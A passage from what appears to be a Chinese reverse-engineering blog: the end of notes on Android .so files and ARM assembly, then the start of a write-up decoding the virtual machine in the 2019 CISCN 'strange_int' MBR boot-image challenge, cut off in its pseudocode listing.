AL 13 0 4 [15] .ARM.extab PROGBITS 000023ac 0023ac 0001a4 00 A 0 0 4 [16] .rodata PROGBITS 00002550 002550 000566 01 AMS 0 0 1 [17] .fini_array FINI_ARRAY 00003e3c 002e3c 000008 04 WA 0 0 4 [18] .data.rel.ro PROGBITS 00003e44 002e44 000048 00 WA 0 0 4 [19] .dynamic DYNAMIC 00003e8c 002e8c 000110 08 WA 4 0 4 [20] .got PROGBITS 00003f9c 002f9c 000064 00 WA 0 0 4 [21] .data PROGBITS 00004000 003000 000018 00 WA 0 0 4 [22] .bss NOBITS 00004018 003018 000001 00 WA 0 0 1 [23] .comment PROGBITS 00000000 003018 000109 01 MS 0 0 1 [24] .note.gnu.gold-ve NOTE 00000000 003124 00001c 00 0 0 4 [25] .ARM.attributes ARM_ATTRIBUTES 00000000 003140 000034 00 0 0 1 [26] .shstrtab STRTAB 00000000 003174 00010f 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) 显示符号表： 1234567891011121314151617181920212223242526272829$ readelf -s libnative-lib.soSymbol table '.dynsym' contains 25 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 00000000 0 FUNC GLOBAL DEFAULT UND __cxa_atexit@LIBC (2) 2: 00000000 0 FUNC GLOBAL DEFAULT UND __cxa_finalize@LIBC (2) 3: 00000000 0 OBJECT GLOBAL DEFAULT UND __stack_chk_guard@LIBC (2) 4: 00000000 0 FUNC GLOBAL DEFAULT UND __stack_chk_fail@LIBC (2) 5: 00000000 0 FUNC GLOBAL DEFAULT UND __android_log_print 6: 00000000 0 OBJECT GLOBAL DEFAULT UND __sF@LIBC (2) 7: 00000000 0 FUNC GLOBAL DEFAULT UND abort@LIBC (2) 8: 00000000 0 FUNC GLOBAL DEFAULT UND fflush@LIBC (2) 9: 00000000 0 FUNC GLOBAL DEFAULT UND fprintf@LIBC (2) 10: 00000000 0 FUNC GLOBAL DEFAULT UND dladdr@LIBC (3) 11: 00000000 0 FUNC GLOBAL DEFAULT UND __aeabi_memclr8 12: 00000000 0 FUNC GLOBAL DEFAULT UND __aeabi_memcpy 13: 00000000 0 FUNC GLOBAL DEFAULT UND __gnu_Unwind_Find_exidx 14: 00000000 0 FUNC GLOBAL DEFAULT UND snprintf@LIBC (2) 15: 00004018 0 NOTYPE GLOBAL DEFAULT ABS _edata 16: 00004019 0 NOTYPE GLOBAL DEFAULT ABS _end 17: 00000975 36 FUNC GLOBAL DEFAULT 13 Java_com_assassinq_easycp 18: 00000999 44 FUNC WEAK DEFAULT 13 _ZN7_JNIEnv12NewStringUTF 19: 00000b87 72 FUNC WEAK DEFAULT 13 _ZN7_JNIEnv15RegisterNati 20: 00000b5d 42 FUNC WEAK DEFAULT 13 _ZN7_JNIEnv9FindClassEPKc 21: 00004018 0 NOTYPE GLOBAL DEFAULT ABS __bss_start 22: 000009e9 224 FUNC GLOBAL DEFAULT 13 JNI_OnLoad 23: 00000ac9 52 FUNC WEAK DEFAULT 13 _ZN7_JavaVM6GetEnvEPPvi 24: 000009c5 36 FUNC GLOBAL DEFAULT 13 sayHi 显示 Dynamic Section： 123456789101112131415161718192021222324252627282930313233$ readelf -d libnative-lib.soDynamic section at offset 0x2e8c contains 29 entries: Tag Type Name/Value 0x00000003 (PLTGOT) 0x3fb0 0x00000002 (PLTRELSZ) 136 (bytes) 0x00000017 (JMPREL) 0x7c8 0x00000014 (PLTREL) REL 0x00000011 (REL) 0x6e0 0x00000012 (RELSZ) 232 (bytes) 0x00000013 (RELENT) 8 (bytes) 0x6ffffffa (RELCOUNT) 26 0x00000006 (SYMTAB) 0x1f0 0x0000000b (SYMENT) 16 (bytes) 0x00000005 (STRTAB) 0x380 0x0000000a (STRSZ) 467 (bytes) 0x6ffffef5 (GNU_HASH) 0x554 0x00000004 (HASH) 0x5a0 0x00000001 (NEEDED) Shared library: [liblog.so] 0x00000001 (NEEDED) Shared library: [libm.so] 0x00000001 (NEEDED) Shared library: [libdl.so] 0x00000001 (NEEDED) Shared library: [libc.so] 0x0000000e (SONAME) Library soname: [libnative-lib.so] 0x0000001a (FINI_ARRAY) 0x3e3c 0x0000001c (FINI_ARRAYSZ) 8 (bytes) 0x0000001e (FLAGS) BIND_NOW 0x6ffffffb (FLAGS_1) Flags: NOW 0x6ffffff0 (VERSYM) 0x650 0x6ffffffc (VERDEF) 0x684 0x6ffffffd (VERDEFNUM) 1 0x6ffffffe (VERNEED) 0x6a0 0x6fffffff (VERNEEDNUM) 2 0x00000000 (NULL) 0x0 SO Helper无名侠大佬开发的软件。可以用来快速地获取 so 文件的一些基本信息，提供较弱的汇编功能。 ARM 汇编代码ARM 是 ARM 公司的 32 位处理器，其汇编指令的机器码就是 32 位。 ARM 汇编语言是一门“低级”语言可以和系统的底层相互沟通； ARM 汇编语言编写的程序运行速度快，占用内存少； ARM 编写的代码难懂，难以维护； C 语言能实现的 ARM 汇编语言都能实现； ARM 具有 31 个通用寄存器，6 个状态寄存器； ARM 处理器支持 7 种运行模式。 用户模式：ARM 处理器正常的程序执行状态。 快速中断模式：用于高速数据传输或通道处理。 外部中断模式：用于通用的中断处理。 管理模式：操作系统使用的保护模式。 数据访问终止模式：当数据或指令预取终止时进如该模式，可用于模拟存储及存储保护。 系统模式：运行具有特权的操作系统任务。 未定义指令中止模式：当未定义的指令执行时进入该模式。 ARM 汇编难以分析的原因：IDA 自身的缺陷；函数库与类有时无法识别；自身对 ARM 汇编的熟练度。 函数参数传递遵循 ATPCS 规则，前 4 个参数使用 R0~R3 传递，剩余参数通过堆栈传递。 ARM 和 ThumbThumb 是 16 位的 ARM 汇编。一般地，ARM 每行代码占 4 个字节码，Thumb 每个指令占 2 个字节。两者不能混用，但可以通过 BX、BLX 等指令在跳转的时候实现切换。在动态调试的时候，IDA 对 ARM 和 Thumb 的分析会混淆，可以用 Alt+G 来修改相应的识别。 ARM 寄存器 R0-R7：通用寄存器 R8-R10：不常用的通用寄存器 R11：基质寄存器（FP） R12：暂时寄存器（IP） R13：堆栈制作（SP） R14：链接寄存器（LR） CPSR：状态寄存器 ARM 指令寄存器交互指令 LDR：从存储器中加载数据到寄存器。 LDR R1, [R2]：把 R2 指向的位置的数据给 R1 STR：把寄存器的数据存储到存储器 STR R1, [R2]：在 R2 指向的地址，存储 R1 LDM：将存储器的数据加载到一个寄存器列表。 LDM R0, {R1, R2, R3}：把 R0 中的数据一次加载到 R1、R2、R3 SDM：将一个寄存器列表的数据存储到指定的存储器 SDM R0, {R1, R2, R3}：把 R1、R2、R3 加载到 R0 单元 PUSH：入栈 POP：出栈 数据传送指令 MOV：将立即数或寄存器的数据传送到目标寄存器 数据算数运算指令ADD（加法）ADD 将把两个操作数加起来，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。 123ADD R0, R1, R2 @ R0 = R1 + R2ADD R0, R1, #256 @ R0 = R1 + 256ADD R0, R2, R3, LSL#1 @ R0 = R2 + (R3 &lt;&lt; 1) 加法可以在有符号和无符号数上进行。 ADC：带进位的加法 SUB（减法）SUB 用操作数 1 减去操作数 2，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。 123SUB R0, R1, R2 @ R0 = R1 - R2SUB R0, R1, #256 @ R0 = R1 - 256SUB R0, R2, R3, LSL#1 @ R0 = R2 - (R3 &lt;&lt; 1) 减法可以在有符号和无符号数上进行。 SBC：带进位的减法 MUL（乘法）和 DIV（除法） 给出的所有操作数、和目的寄存器必须为简单的寄存器。 不能对操作数 2 使用立即值或被移位的寄存器。 目的寄存器和操作数 1 必须是不同的寄存器。 不能指定 R15 为目的寄存器 MUL 提供 32 位整数乘法。如果操作数是有符号的，可以假定结果也是有符号的。 MLA：带累加的乘法 除法指令 DIV 的条件与乘法类似。 SDIV：带符号除法 UDIV：不带符号位除法 数据逻辑运算指令 AND：与 ORR：或 EOR：异或 LSL：逻辑左移 LSR：逻辑右移 比较指令 CMP：比较指令 其他指令 SWT：切换用户模式 DCB：伪指令 跳转指令 B：无条件跳转 BL：带链接的无条件跳转 BLX：带状态的无条件跳转 BNE：不相等跳转 BEQ：相等跳转 偏移地址计算 ARM：低 27 位是偏移位置 偏移 = (目标地址 - 当前 PC 地址) / 指令长度 正数下跳，负数上跳 Thumb 同理 目标地址 = 偏移 * 指令长度 + 当前偏移地址 ARM 代码编写处理器架构定义： .arch 指定了 ARM 处理器架构。 armv5te 表示本程序在 armv5te 架构处理器上运行。 .fpu 指定了协处理器的类型。 softvfp 表示使用浮点运算库来模拟协处理运算。 .ebi_attribute 指定了一些接口属性。 12345678910.arch armv5te @处理器架构.fpu softvfp @协处理器类型.ebi_attribute 20, 1 @接口属性.ebi_attribute 21, 1.ebi_attribute 23, 1.ebi_attribute 24, 1.ebi_attribute 25, 1.ebi_attribute 26, 1.ebi_attribute 30, 1.ebi_attribute 18, 1 段定义： .section：定义只读数据，属性是默认 .text：定义了代码段。 注释方法： /.../：多行注释 @：单行注释 标号方式（和 8086 类似）： 123loop: ...end loop 程序中所有以“.”开头的指令都是汇编指令，他们不属于 ARM 指令集： .file：制定了源文件名。 .align：代码对其方式。 .ascii：声明字符串。 .global：声明全局变量。 .type：指定符号的类型。 声明函数的方法： 12345678910.global 函数名.type 函数名, %function函数名: &lt;...函数体...&gt;声明一个实现两个数相加的函数的代码.global MyAdd.type MyAdd, &amp;functionMyAdd: ADD R0, R0, R1 MOV PC, LR ARM 处理器寻址方式立即寻址12@ 井号（#）作为前缀，表示16进制时以“0x”开头MOV R0，#1234 @ R0=0x1234 寄存器寻址1MOV R0, R1 @ R0=R1 寄存器移位寻址五种移位操作： LSL：逻辑左移，移位后寄存器空出的低位补 0； LSR：逻辑右移，移位后寄存器空出的高位补 0； ASR：算数右移，移动过程中符号位不变。如果操作数是整数，则移位后空出的高位补 0，否则补 1； ROR：循环右移，移位后移出的低位填入移位空出的高位； RRX：带扩展的循环右移，操作数右移移位，移位空出的高位用 C 标志的值填充。 1MOV R0, R1, LSL#2 @ R0=R1*4 寄存器间接寻址1LDR R0，[R1] @ 将R1寄存器中的值作为地址，取出地址中的值赋予R0 寄存器间接基址偏移寻址1LDR R0, [R1, #-4] @ 将R1寄存器的值-0x4的值作为地址，取出地址中的值给R0 多寄存器寻址1234567@ LDM 是数据加载命令，指令的后缀IA表示每次执行完成加载操作后R0寄存器的值自增1LDMIA R0, &#123;R1, R2, R3, R4&#125;@ R1=[R0]@ R2=[R0+#4]@ R3=[R0+#8]@ R4=[R0+#12]@ ARM中，字表示的是一个32位。这里+#4的原因是因为32位占4个字节 堆栈寻址12STMFD SP!, &#123;R1-R7, LR&#125; @ 入栈，多用于保存子程序堆栈LDMFD SP!, &#123;R1-R7, LR&#125; @ 出栈，多用于恢复子程序堆栈 块拷贝寻址块拷贝可实现连续地址数据从存储器的某一位置拷贝到另一位置。 1LDMIA R0!, &#123;R1-R3&#125; @ 从寄存器指向的存储单元中读取3个字到R1-R3寄存器。 相对寻址相对寻址一程序计数器 PC 的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到的操作数的有效地址。 Referenceshttps://www.bilibili.com/video/av45424886https://blog.csdn.net/miao_007/article/details/87632758https://stackoverflow.com/questions/4629308/any-simple-way-to-log-in-android-ndk-codehttps://www.jianshu.com/p/acbf724fdcc9https://blog.csdn.net/afei__/article/details/81031965https://www.luoxudong.com/360.htmlhttps://www.jianshu.com/p/23af9151837ehttps://juejin.im/post/5afe28446fb9a07aa0483d0ahttps://www.52pojie.cn/thread-699268-1-1.htmlhttps://www.52pojie.cn/thread-673175-1-1.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"android","slug":"android","permalink":"blog.b3ale.cn/tags/android/"}]},{"title":"2019-CISCN-strange_int","slug":"2019-CISCN-strange-int","date":"2020-01-24T08:46:38.000Z","updated":"2020-01-27T03:42:36.631Z","comments":true,"path":"2020/01/24/2019-CISCN-strange-int/","link":"","permalink":"blog.b3ale.cn/2020/01/24/2019-CISCN-strange-int/","excerpt":"一道 MBR 虚拟机的题目，同时也熟悉了使用 bochs 对 MBR 的调试。","text":"一道 MBR 虚拟机的题目，同时也熟悉了使用 bochs 对 MBR 的调试。 Analysis12$ file Image.binImage.bin: DOS/MBR boot sector 先在 IDA 中 16 位的模式打开。在 7C00~7C0E 的代码（MBR 的加载地址是 0x7C00 处）是对寄存器和栈指针进行初始化操作；在 7C0F~7C12 的代码是 x86 系统中的第 17 号调用，设置了显示模式；在 7C14~7C24 的代码是 x86 系统中的第 20 号调用，从软盘的第 0 个磁盘第 0 个柱面第 2 个扇区开始的共 28 个扇区读取数据到内存的 10000000 处；在 7C2B~7C3B 的代码将内存中 10000000~10002000 的数据赋值给内存 0~2000 处；在 7C3D~7C47 的代码初始化 IDT 和 GDT；在 7C4C~7C52 的代码处，启动保护模式，并跳转至 32 位代码段： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162MBR16:0000 sub_0 proc nearMBR16:0000 jmp far ptr 7C0h:5MBR16:0000 sub_0 endpMBR16:0000MBR16:0005MBR16:0005 ; =============== S U B R O U T I N E =======================================MBR16:0005MBR16:0005MBR16:0005 sub_5 proc nearMBR16:0005 mov ax, csMBR16:0007 mov ds, axMBR16:0009 assume ds:MBR16MBR16:0009 mov ss, axMBR16:000B assume ss:MBR16MBR16:000B mov sp, 400hMBR16:000E cldMBR16:000F mov ax, 3MBR16:0012 int 10h ; - VIDEO - SET VIDEO MODEMBR16:0012 ; AL = modeMBR16:0014 mov dx, 0MBR16:0017 mov cx, 2MBR16:001A mov ax, 1000hMBR16:001D mov es, axMBR16:001F assume es:nothingMBR16:001F xor bx, bxMBR16:0021 mov ax, 228hMBR16:0024 int 13h ; DISK - READ SECTORS INTO MEMORYMBR16:0024 ; AL = number of sectors to read, CH = track, CL = sectorMBR16:0024 ; DH = head, DL = drive, ES:BX -&gt; buffer to fillMBR16:0024 ; Return: CF set on error, AH = status, AL = number of sectors readMBR16:0026 jnb short loc_2AMBR16:0028MBR16:0028 loc_28: ; CODE XREF: sub_5:loc_28↓jMBR16:0028 jmp short loc_28MBR16:002A ; ---------------------------------------------------------------------------MBR16:002AMBR16:002A loc_2A: ; CODE XREF: sub_5+21↑jMBR16:002A cliMBR16:002B mov ax, 1000hMBR16:002E mov ds, axMBR16:0030 assume ds:nothingMBR16:0030 xor ax, axMBR16:0032 mov es, axMBR16:0034 assume es:MBR16MBR16:0034 mov cx, 2000hMBR16:0037 sub si, siMBR16:0039 sub di, diMBR16:003B rep movsbMBR16:003D mov ax, 7C0hMBR16:0040MBR16:0040 loc_40: ; DATA XREF: sub_5+D↑rMBR16:0040 mov ds, axMBR16:0042 assume ds:nothingMBR16:0042 lidt fword ptr ds:6Fh ; Init IDTMBR16:0047 lgdt fword ptr ds:75h ; Init GDTMBR16:004CMBR16:004C loc_4C: ; DATA XREF: sub_5+1F↑rMBR16:004C mov ax, 1 ; Start Protected ModeMBR16:004F lmsw ax ; Jump to 32-bit CodeMBR16:004F sub_5 endpMBR16:004FMBR16:004F MBR16 ends 何为 IDT 和 GDT？GDT全局描述表（Global Descriptor Table）。在实时模式下，对一个内存地址的访问是通过段寄存器的方式来进行（一个段具备两个元素：[Base Address, Limit]），即段模式。而在保护模式下（保护模式运行在 32 位系统上），内存的管理模式分为两种，段模式和页模式，其中页模式也是基于段模式的（纯段模式和段页模式）。 在保护模式下，对一个段的描述则包括 3 方面因素：[Base Address, Limit, Access]，它们加在一起被放在一个 64-bit 长的数据结构中，被称为段描述符。而段寄存器仍然是 16-bit，无法通过 16-bit 长度的段寄存器来直接引用 64-bit 的段描述符。 解决方法就是把这些长度为 64-bit 的段描述符放入一个数组即 GDT 中。当程序员通过段寄存器来引用一个段描述符时，CPU 必须知道 GDT 的入口，也就是基地址放在哪里，所以 Intel 的设计者门提供了一个寄存器 GDTR 用来存放 GDT 的入口地址，程序员将 GDT 设定在内存中某个位置之后，可以通过 LGDT 指令将 GDT 的入口地址装入此寄存器，从此以后，CPU 就根据此寄存器中的内容作为 GDT 的入口来访问 GDT 了。 IDT中断描述符表（Interrupt Descriptor Table），和 GDT 类似，记录了 0~255 的中断号和调用函数之间的关系。 段描述符使用数组存储，使用 LIDT 指令将 IDT 的入口地址装入 IDTR 寄存器。 接下来在 IDA 中用 32 位模式打开。一开始的一段代码对 IDT 和 GDT 进行了初始化： 1234567891011121314151617seg001:00000205 sub_205 proc nearseg001:00000205 mov ds, eaxseg001:00000207 lss esp, fword ptr ds:dword_B34+28hseg001:0000020E call IDT_Initseg001:00000213 call GDT_Initseg001:00000218 mov eax, 10h ; DATA XREF: sub_28B+27↓rseg001:0000021D mov ds, eaxseg001:0000021F assume ds:nothingseg001:0000021F mov es, eaxseg001:00000221 assume es:nothingseg001:00000221 mov fs, eax ; DATA XREF: sub_283↓rseg001:00000223 assume fs:nothingseg001:00000223 mov gs, eaxseg001:00000225 assume gs:nothingseg001:00000225 lss esp, large ds:0B5Chseg001:00000225 ; DATA XREF: sub_28B+11↓oseg001:0000022C xor ebx, ebx IDT_init 处，先将 000800FC 赋给了 EAX，将 8E00 赋给了 DX。然后进行了一个 256 次的循环，每次循环从 00080128 的地址开始，分别存入 EAX 和 EDX。最后加载 IDTR，地址为 11C。 1234567891011121314151617seg001:0000028B IDT_Init proc near ; CODE XREF: sub_205+9↑pseg001:0000028B mov edx, 0FChseg001:00000290 mov eax, 80000hseg001:00000295 mov ax, dxseg001:00000298 mov dx, 8E00hseg001:0000029C lea edi, ds:128hseg001:000002A2 mov ecx, 100hseg001:000002A7seg001:000002A7 loc_2A7: ; CODE XREF: IDT_Init+25↓jseg001:000002A7 mov [edi], eaxseg001:000002A9 mov [edi+4], edxseg001:000002AC add edi, 8seg001:000002AF dec ecxseg001:000002B0 jnz short loc_2A7seg001:000002B2 lidt large fword ptr ds:11Chseg001:000002B9 retnseg001:000002B9 IDT_Init endp 在 bogus 中调试得到 IDTR 中的值为 0x012807ff（可以使用 show mode 命令来判断实模式向保护模式的转换）。依据之前的知识，可以知道基址为 0x0128 以及长度为 0x07ff： 123&lt;bochs:40&gt; x 0x11c[bochs]:0x000000000000011c &lt;bogus+ 0&gt;: 0x012807ff 中断门描述符被初始化为 0000 8e00 0008 00fc（偏移：0xfc；段选择符：0x8；P：1，即段是否在内存；DPL：0），如下： 1234567&lt;bochs:79&gt; x/20 0x128[bochs]:0x0000000000000128 &lt;bogus+ 0&gt;: 0x000800fc 0x00008e00 0x000800fc 0x00008e000x0000000000000138 &lt;bogus+ 16&gt;: 0x000800fc 0x00008e00 0x000800fc 0x00008e000x0000000000000148 &lt;bogus+ 32&gt;: 0x000800fc 0x00008e00 0x000800fc 0x00008e000x0000000000000158 &lt;bogus+ 48&gt;: 0x000800fc 0x00008e00 0x000800fc 0x00008e000x0000000000000168 &lt;bogus+ 64&gt;: 0x000800fc 0x00008e00 0x000800fc 0x00008e00 GDT_init 处，加载 GDTR 的地址为 122： 1234seg001:00000283 GDT_Init proc near ; CODE XREF: sub_205+E↑pseg001:00000283 lgdt large fword ptr ds:122hseg001:0000028A retnseg001:0000028A GDT_Init endp 同理，可以知道 GDT 基址为 0x0928 以及长度为 0x001f。不过这里没有对 GDT 进行初始化： 123&lt;bochs:74&gt; x 0x122[bochs]:0x0000000000000122 &lt;bogus+ 0&gt;: 0x0928001f 在 22E~25F 的代码执行了一个 16 次的循环，其中 0x21~0x30 的中断向量描述符在内存的原始位置在 D08 处，循环中将每个中断向量存储到 128 处；然后调用了 NextHandler 函数，最后调用 INT 21H。 123456789101112131415161718192021222324seg001:0000022E loc_22E: ; CODE XREF: sub_205+58↓jseg001:0000022E nopseg001:0000022F cmp ebx, 10hseg001:00000232 jge short loc_25Fseg001:00000234 mov eax, 80000hseg001:00000239 lea edx, ds:0D08h[ebx*4]seg001:00000240 mov edx, [edx]seg001:00000242 mov ax, dxseg001:00000245 mov dx, 8E00hseg001:00000249 mov ecx, 21h ; &apos;!&apos;seg001:0000024E add ecx, ebxseg001:00000250 lea esi, ds:128h[ecx*8]seg001:00000257 mov [esi], eaxseg001:00000259 mov [esi+4], edxseg001:0000025C inc ebxseg001:0000025D jmp short loc_22Eseg001:0000025F ; ---------------------------------------------------------------------------seg001:0000025Fseg001:0000025F loc_25F: ; CODE XREF: sub_205+2D↑jseg001:0000025F ; sub_205+61↓jseg001:0000025F call NextHandlerseg001:00000264 int 21h ; DOS -seg001:00000266 jmp short loc_25Fseg001:00000266 sub_205 endp 获取得到所有中断向量的地址如下： 123456789101112131415161718...IDT[0x21]=32-Bit Interrupt Gate target=0x0008:0x00000b7c, DPL=0IDT[0x22]=32-Bit Interrupt Gate target=0x0008:0x00000b8a, DPL=0IDT[0x23]=32-Bit Interrupt Gate target=0x0008:0x00000ba1, DPL=0IDT[0x24]=32-Bit Interrupt Gate target=0x0008:0x00000bc1, DPL=0IDT[0x25]=32-Bit Interrupt Gate target=0x0008:0x00000be1, DPL=0IDT[0x26]=32-Bit Interrupt Gate target=0x0008:0x00000bfc, DPL=0IDT[0x27]=32-Bit Interrupt Gate target=0x0008:0x00000c17, DPL=0IDT[0x28]=32-Bit Interrupt Gate target=0x0008:0x00000c32, DPL=0IDT[0x29]=32-Bit Interrupt Gate target=0x0008:0x00000c4f, DPL=0IDT[0x2a]=32-Bit Interrupt Gate target=0x0008:0x00000c6c, DPL=0IDT[0x2b]=32-Bit Interrupt Gate target=0x0008:0x00000c84, DPL=0IDT[0x2c]=32-Bit Interrupt Gate target=0x0008:0x00000c96, DPL=0IDT[0x2d]=32-Bit Interrupt Gate target=0x0008:0x00000cb5, DPL=0IDT[0x2e]=32-Bit Interrupt Gate target=0x0008:0x00000cf7, DPL=0IDT[0x2f]=32-Bit Interrupt Gate target=0x0008:0x00000ce0, DPL=0IDT[0x30]=32-Bit Interrupt Gate target=0x0008:0x00000cd4, DPL=0... 在 IDA 中定位到所有中断向量的地址，分别对应着不同的函数，这一段代码后面会用到： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111seg001:00000D7C lea ecx, ds:0B64h[ecx*4]seg001:00000D83 mov [ecx], eaxseg001:00000D85 jmp loc_EF8seg001:00000D8A ; ---------------------------------------------------------------------------seg001:00000D8A lea eax, ds:0B64h[eax*4]seg001:00000D91 mov eax, [eax]seg001:00000D93 lea ecx, ds:0B64h[ecx*4]seg001:00000D9A mov [ecx], eaxseg001:00000D9C jmp loc_EF8seg001:00000DA1 ; ---------------------------------------------------------------------------seg001:00000DA1 lea eax, ds:0B64h[eax*4]seg001:00000DA8 mov eax, [eax]seg001:00000DAA lea ecx, ds:0B64h[ecx*4]seg001:00000DB1 lea eax, ds:0D48h[eax*4]seg001:00000DB8 mov eax, [eax]seg001:00000DBA mov [ecx], eaxseg001:00000DBC jmp loc_EF8seg001:00000DC1 ; ---------------------------------------------------------------------------seg001:00000DC1 lea eax, ds:0B64h[eax*4]seg001:00000DC8 mov eax, [eax]seg001:00000DCA lea ecx, ds:0B64h[ecx*4]seg001:00000DD1 mov ecx, [ecx]seg001:00000DD3 lea ecx, ds:0D48h[ecx*4]seg001:00000DDA mov [ecx], eaxseg001:00000DDC jmp loc_EF8seg001:00000DE1 ; ---------------------------------------------------------------------------seg001:00000DE1 lea eax, ds:0B64h[eax*4]seg001:00000DE8 mov edx, [eax]seg001:00000DEA lea ecx, ds:0B64h[ecx*4]seg001:00000DF1 mov eax, [ecx]seg001:00000DF3 add eax, edxseg001:00000DF5 mov [ecx], eaxseg001:00000DF7 jmp loc_EF8seg001:00000DFC ; ---------------------------------------------------------------------------seg001:00000DFC lea eax, ds:0B64h[eax*4]seg001:00000E03 mov edx, [eax]seg001:00000E05 lea ecx, ds:0B64h[ecx*4]seg001:00000E0C mov eax, [ecx]seg001:00000E0E sub eax, edxseg001:00000E10 mov [ecx], eaxseg001:00000E12 jmp loc_EF8seg001:00000E17 ; ---------------------------------------------------------------------------seg001:00000E17 lea eax, ds:0B64h[eax*4]seg001:00000E1E mov edx, [eax]seg001:00000E20 lea ecx, ds:0B64h[ecx*4]seg001:00000E27 mov eax, [ecx]seg001:00000E29 xor eax, edxseg001:00000E2B mov [ecx], eaxseg001:00000E2D jmp loc_EF8seg001:00000E32 ; ---------------------------------------------------------------------------seg001:00000E32 lea eax, ds:0B64h[eax*4]seg001:00000E39 mov eax, [eax]seg001:00000E3B lea edx, ds:0B64h[ecx*4]seg001:00000E42 mov cl, alseg001:00000E44 mov eax, [edx]seg001:00000E46 shl eax, clseg001:00000E48 mov [edx], eaxseg001:00000E4A jmp loc_EF8seg001:00000E4F ; ---------------------------------------------------------------------------seg001:00000E4F lea eax, ds:0B64h[eax*4]seg001:00000E56 mov eax, [eax]seg001:00000E58 lea edx, ds:0B64h[ecx*4]seg001:00000E5F mov cl, alseg001:00000E61 mov eax, [edx]seg001:00000E63 shr eax, clseg001:00000E65 mov [edx], eaxseg001:00000E67 jmp loc_EF8seg001:00000E6C ; ---------------------------------------------------------------------------seg001:00000E6C lea eax, ds:0B64h[eax*4]seg001:00000E73 mov eax, [eax]seg001:00000E75 lea ecx, ds:0B64h[ecx*4]seg001:00000E7C mov edx, [ecx]seg001:00000E7E and eax, edxseg001:00000E80 mov [ecx], eaxseg001:00000E82 jmp short loc_EF8seg001:00000E84 ; ---------------------------------------------------------------------------seg001:00000E84 lea eax, ds:0B64h[ecx*4]seg001:00000E8B mov eax, [eax]seg001:00000E8D lea ecx, dword_B34+44hseg001:00000E93 mov [ecx], eaxseg001:00000E95 iretseg001:00000E96 ; ---------------------------------------------------------------------------seg001:00000E96 lea eax, ds:0B64h[eax*4]seg001:00000E9D mov eax, [eax]seg001:00000E9F test eax, eaxseg001:00000EA1 jnz short loc_EF8seg001:00000EA3 lea eax, ds:0B64h[ecx*4]seg001:00000EAA mov eax, [eax]seg001:00000EAC lea ecx, dword_B34+44hseg001:00000EB2 mov [ecx], eaxseg001:00000EB4 iretseg001:00000EB5 ; ---------------------------------------------------------------------------seg001:00000EB5 lea eax, ds:0B64h[eax*4]seg001:00000EBC mov eax, [eax]seg001:00000EBE test eax, eaxseg001:00000EC0 jz short loc_EF8seg001:00000EC2 lea eax, ds:0B64h[ecx*4]seg001:00000EC9 mov eax, [eax]seg001:00000ECB lea ecx, dword_B34+44hseg001:00000ED1 mov [ecx], eaxseg001:00000ED3 iretseg001:00000ED4 ; ---------------------------------------------------------------------------seg001:00000ED4 lea eax, unk_F94seg001:00000EDA call sub_2EAseg001:00000EDF hltseg001:00000EE0 ; ---------------------------------------------------------------------------seg001:00000EE0 lea eax, unk_FA0seg001:00000EE6 call sub_2EAseg001:00000EEB lea eax, word_FAEseg001:00000EF1 call sub_2EAseg001:00000EF6 hlt 接下来在 NextHandler 处，包括 INT 21H 的三条指令，类似于一个 switch 语句，根据以前的做题经验，基本可以判断出是个虚拟机。在 NextHandler 函数中，首先从 B78 处获取值作为 D48 的偏移，将 D48 处的值分别赋值给 给 065（操作符）、ecx（操作数 1）、eax（操作数 2），而 065 地址处的值为 21H，即指令 INT 21H 的操作数，故这里中断的调用是和 edi 的取值有关系的： 123456789seg001:00000268 NextHandler proc near ; CODE XREF: sub_205:loc_25F↑pseg001:00000268 mov edi, large ds:0B78hseg001:0000026E lea edi, ds:0D48h[edi*4]seg001:00000275 mov eax, [edi]seg001:00000277 mov large ds:65h, alseg001:0000027C mov ecx, [edi+4]seg001:0000027F mov eax, [edi+8]seg001:00000282 retnseg001:00000282 NextHandler endp 回过去看上面中断代码的最后一部分是将上面 edi 中的值加 3，即取下一组指令： 1234567seg001:00000EF8 loc_EF8: ; CODE XREF: seg001:00000D85↑jseg001:00000EF8 ; seg001:00000D9C↑j ...seg001:00000EF8 lea ecx, dword_B34+44hseg001:00000EFE mov eax, [ecx]seg001:00000F00 add eax, 3seg001:00000F03 mov [ecx], eaxseg001:00000F05 iret 那么之前的那段代码就是不同的操作符时进行的中断调用。这里就先把每个中断的部分的代码进行翻译（buf 的地址为 B64，code 的地址为 D48，pc 的地址为 B78）： 中断编号 功能描述 0x21 buf[a] = b 0x22 buf[a] = buf[b] 0x23 buf[a] = code[buf[b]] 0x24 code[buf[a]] = buf[b] 0x25 buf[a] += buf[b] 0x26 buf[a] -= buf[b] 0x27 buf[a] ^= buf[b] 0x28 buf[a] &lt;&lt;= buf[b] 0x29 buf[a] &gt;&gt;= buf[b] 0x2A buf[a] &amp;= buf[b] 0x2B pc = a 0x2C if(buf[b] == 0) pc = buf[a] 0x2D if(buf[b] != 0) pc = buf[a] 0x2E 终止 CPU 运行，即 hlt 指令 0x2F 输出 flag 正确提示 0x30 输出 flag 错误提示 根据上面的分析，用 IDAPython 把虚拟机指令 dump 下来： 123456789code = []for addr in range(0x0F48, 0x11E0, 12): ins = Dword(addr) op1 = Dword(addr + 4) op2 = Dword(addr + 8) code.append(ins) code.append(op1) code.append(op2)print code 然后用脚本处理一下，得到伪代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230buf[0] = 129buf[1] ^= buf[1]code[buf[1]] = buf[1] # 0buf[2] = 